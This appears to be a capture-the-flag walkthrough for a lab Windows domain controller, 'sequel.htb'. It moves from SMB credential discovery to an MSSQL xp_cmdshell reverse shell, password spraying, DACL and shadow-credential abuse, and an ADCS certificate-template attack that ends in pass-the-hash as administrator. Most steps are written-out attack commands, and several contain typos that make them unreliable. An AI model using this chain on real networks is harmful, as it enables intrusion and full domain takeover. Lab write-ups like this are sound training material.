Started with a nmap scan
```
53 DNS
80 Kerberis
135 RPC
139 netbios-ssn
389 LDAP
445 ds?
464 kpasswd5
593 RPC over HTTP
636 LDAP
1433 SQL
3268 LDAP
5985 HTTP API
```
There is a lot of ports open and the room gives us a pair of login creds to use `rose:KxEPkKe6R8su` first what Im going to check is all the users on the host machine with a ridbrute and we have a good amount of users 
```
michael
ryan
oscar
sql_svc
rose
ca_svc
```
These are some users that stand out and since we can log into the SMB server lets see what shares we can access
```
ACCOUNTING Department
IPC$
NETLOGON
SYSVOL
Users
```
Lets check out the accounting share first and there is 2 files in this share
```
accounting_2024.x;sx
accounts.xlsx
```
Using LibreOffice Calc to open the `accounts.xlsx ` file or unzip it to see the contents and there is a account with a password we can use to get access to the MSSQL server `oscar:86LxLBMgEWaKUnBG` and `sa:MSSQLP@ssw0rd!` used this command to connect 
`impacket-mssqlclient sequel.htb/sa@10.10.11.51` and with the SA account we can enable `xp_cmdshell` with these commands 
```
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
to Verify
EXEC sp_configure 'xp_cmdshell';
```
and now we can get a reverse shell with this command
```
./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u "sa" -p "MSSQKO@ssw0rd!" -c "powershell -e base64here" 
```
and we get a shell back as user `sql_svc` and if we go to `C:\SQL2019\ExpressAdv_ENU` and run `cat sql-Configuration.INI` and if has the creds for the `sql_svc` user `WqSZAF6CysDQbGb3` and with this new password I used netexec with spray `win-rm ` with the userlist and the new password and it worked for the user `ryan` and if we go to the Desktop we got the user flag now we can run `bloodhound-python ` and we can also run `bloody-ad` to set the user 
```
sudo bloody-ad --host '10.10.11.51' -d 'sequel.htb' -u 'ryan' -p 'password' set owner 'ca_svc' 'ryan'
```
and now we set the user Ryan now we need to change the rights to the user 
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"passowrd"
```
now we use `certipy-ad` to get the ticket 
```
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'password' -account 'ca_svc' -dc-ip '10.10.11.51'
```
now we need to make sure are time match's the time on the box now we need to drop `Certify.exe` onto the machine and run this command
`./Certify.exe find /domain:sequel.htb` and we can identify a vulnerable template name `DunderMifflinAuthentication` now we can exploit this to update the certificate 
```
KRBCCNAE=$PWN/ca_svc,ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
```
now that's its updated we can get the pfx certificate 
```
ceripty-ad req -u ca_svc -hashes 'the hash' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.xx.xx -dns 10.10.xx.xx 
```
now we have the private key and certificate and we can auth and get the hash 
```
certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
```
and we can use this hash to `win-rm` into the host 
```
evil-winrm -i 10.10.xx.xx -U 'adnubustrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```
and we have the root flag now 